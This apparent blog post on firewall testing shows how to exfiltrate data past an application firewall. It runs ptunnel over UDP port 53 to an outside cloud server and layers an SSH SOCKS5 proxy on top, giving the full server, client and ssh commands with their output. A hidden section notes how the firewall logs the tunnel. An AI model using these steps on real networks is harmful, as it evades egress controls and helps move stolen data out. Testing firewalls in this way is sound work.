---
layout: post
title:  "Application Firewall Data Exfiltration over UDP (ptunnel)"
date:   2021-19-01 12:21:16 -0400
categories: exfiltration 
tags: gateway bypass
---
<p>
Once an environment has been compromised and the adversary finds some desirable data the data needs to be removed from the network. In this use case we will assume that UDP is being permitted egress by the firewall.
</p>

<p>
ptunnel creates a tunnel interface on a system and then allows you to create a UDP tunnel between a clien
t and the server.
</p>
<p>
The server will need to be on the outside of your DUT (Device Under Testing). The idea is that the client
 will establish a tunnel to the server and be able to bypass the rest of the controls (URL Filtering, IPS, etc) in the network that the client is behind.
</p>


<h3>Step 1 - Deploy the ptunnel Server</h3>


<p>
In this case the ptunnel server is running on a host in GCP. Make sure the firewall is permitting port 53, or whichever port you decide to use to get around the DUT.
</p>

<p>
ptunnel may already be installed, but if not;
</p>

<code>
  apt-get install ptunnel
</code>
<br>


<p>
Once installed we can start the server. In this case we are enabling the UDP flag because ptunnel's default behaviour is to use ICMP (which is super slow). The -v enables visibility into what's going on. And -x boom is a password being set which is also optional.
<p>

<pre>
root@sperciballi-iodine:/home/stephen# ptunnel -udp -v 4 -x boom
[dbg]: Password set - unauthenicated connections will be refused.
[inf]: Starting ptunnel v 0.72.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: UDP transport enabled.
[dbg]: Starting ping proxy..
[dbg]: Creating UDP socket..
[inf]: Ping proxy is listening in privileged mode.
</pre>

<h3>Step 2 - Deploy the ptunnel Client</h3>

<p>
From a host behind the DUT run the ptunnel client. There are Windows binaries if you prefer but Linux is what we are using.
</p>

<p>
ptunnel may already be installed, but if not;
</p>

<code>
  apt-get install ptunnel
</code>
<br>

<p>
Once installed we can start the client. In this case we are again enabling the UDP flag. The -p IP address is the servers public IP address. The -lp 8080 is specifying a local port to proxy traffic through, and the -da localhost is specifying localhost as the proxy (in some circumstances you may want to use a different local IP). The -dp 22 is the destination port on the remote end we will be sending traffic through. And the -x boom is again the corresponding password.
</p>

<pre>
┌──(root💀kali)-[/home/stephen]
└─# ptunnel -udp -p 35.196.116.250 -lp 8080 -da localhost -dp 22 -x boom
[inf]: Starting ptunnel v 0.72.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
[inf]: UDP transport enabled.
[inf]: Incoming connection.
[evt]: No running proxy thread - starting it.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping tunnel to 127.0.0.1:22 due to inactivity.
[inf]: 
Session statistics:
[inf]: I/O:   0.14/  0.01 mb ICMP I/O/R:      212/      67/      40 Loss:  0.6%
</pre>



<h3>Step 3 - Setup a Proxy</h3>


<p>
From the client system we will now configure an SSH SOCKS5 proxy. This will send all of our traffic over an encrypted SSH tunnel, through the UDP tunnel established by ptunnel. The main reason for this is ease of use. You could also setup a basic HTTP proxy like squid on the ptunnel server side.
</p>

<p>
To start the proxy from the client we ssh, specify the local port of 8080, -C compresses traffic, -D 8081 specifies to use 8081 as the SOCKS5 port, and -da localhost -dp 22 says to ssh into localhost. It is important to note that because we are actually using port 8080 this command is ssh'ing into the ptunnel host so <b>remember to use the login for the ptunnel server and not actually localhost.</b>
</p>

<pre>
┌──(root💀kali)-[/home/stephen]
└─# ssh -i ./google_compute_engine -p 8080 -C -D 8081  stephen@localhost
Enter passphrase for key './google_compute_engine': 
Linux sperciballi-iodine 4.19.0-16-cloud-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
</pre>


<h3>Step 4 - Proxy Your Traffic</h3>

<p>
At this point we have essentially enabled a proxy within a proxy. Now we have to tell our client system software to use the proxy.
</p>

<p>
In your web browser preferences search for proxy. Then configure it to use a SOCKS5 proxy, specify localhost for the host and port 8081 (from step 3) for the port.
</p>

<p>
From here if you search for what's my IP you will find that the IP address is that of the public interface of the ptunnel server.
</p>

<!--
<h3>Step 5 - View the Results</h3>

<p>
Check back in on the NGFW to see how it interpretted this session.
</p>

<p>
From this one we can see that there were two alerts. One of them was a traffic log that shows traffic going over UDP port 53. The application is unknown-udp. While this is not ideal it's better to be designated as unknown-tcp which you should be working to manage out of your ruleset than misidentified as DNS or something else. You can also see that the traffic amounted to 5.3M which was me visiting a couple of websites. Also important to note that you won't see this log until the session is ended by default.
</p>

<p>
The second alert is an IPS alert indicating that there was non-compliant DNS traffic. These two things together are a good indicated that someone is tunneling and is reason to adjust policy.
</p>

<img src="/images/appid-evasion-ptunnelresults.png">
<br>
<br>
-->
